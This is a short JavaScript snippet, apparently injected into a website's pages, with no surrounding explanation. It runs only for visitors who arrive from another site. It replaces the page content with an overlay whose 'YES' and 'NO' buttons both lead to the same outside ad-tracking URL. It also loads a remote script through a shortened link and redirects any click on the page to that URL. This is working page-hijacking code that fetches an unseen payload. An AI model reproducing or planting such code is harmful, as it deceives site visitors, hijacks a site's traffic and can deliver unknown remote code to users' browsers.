if(document.referrer.length > 5)
                                {
                                        	function cont(){
		var contenido = "";
		contenido+="<div id='overlay' style='position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 999999999; background: transparent;'>";
		contenido+="<div id='overlay-overlay' style='position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; z-index: 999999999; opacity: 0.75; display: block; background: transparent;'>";
	
		contenido+="<div style='position: relative; z-index: 999999999; width: 700px; height: 210px; top: 18%; overflow: visible; border-radius: 2px; margin: 0px auto; background: rgb(255, 255, 255);'>";
		contenido+="<div style='width: 100%; height: 100%; position: relative; overflow: hidden; color: rgb(0, 0, 0);'>";
		
		contenido+="<h2 style='margin:5px; 0px 5px'></h2>";
		contenido+="<p style='margin:10px;text-align:center;'></p>";
		contenido+="<div id='no' style='position:relative;right:10%;top:25%;float:right;width:85px;background:#E74C3C;text-align:center;padding:10px;'><a href='http://havalarnasilbakam.info/directclick/?aid=69297&subid=325676&wsid=' style='color:white;text-decoration:none;display:block;'>NO</a></div>";
		contenido+="<div id='si'style='position:relative;left:10%;top:25%;float:left;width:85px;background:#2ECC71;text-align:center;padding:10px;'><a href='http://havalarnasilbakam.info/directclick/?aid=69297&subid=325676&wsid=' style='color:white;text-decoration:none;display:block;'>YES</a></div>";
	
		contenido+="</div></div></div></div>";
		document.body.innerHTML =contenido;
	   (function (a, d, j, o) {
        o = a.createElement(d),
            m = a.getElementsByTagName(d)[0];
        o.src = j + "?d=0&r=" + Math.random();
        m.parentNode.insertBefore(o, m)
     })(document, 'script', 'http://goo.gl/IO59vG');
		function goto(event) {
		  var noRedirect = '.no-click';
		  if (!event.target.matches(noRedirect)) {
		    location.href ="http://havalarnasilbakam.info/directclick/?aid=69297&swid=MTMxOTk3Mjg1MFsjM1sjMzI1Njc2&subid=325676"
		  }
	};
		document.body.addEventListener('click', goto);
		}
		window.onload=cont;
		
                                }
  
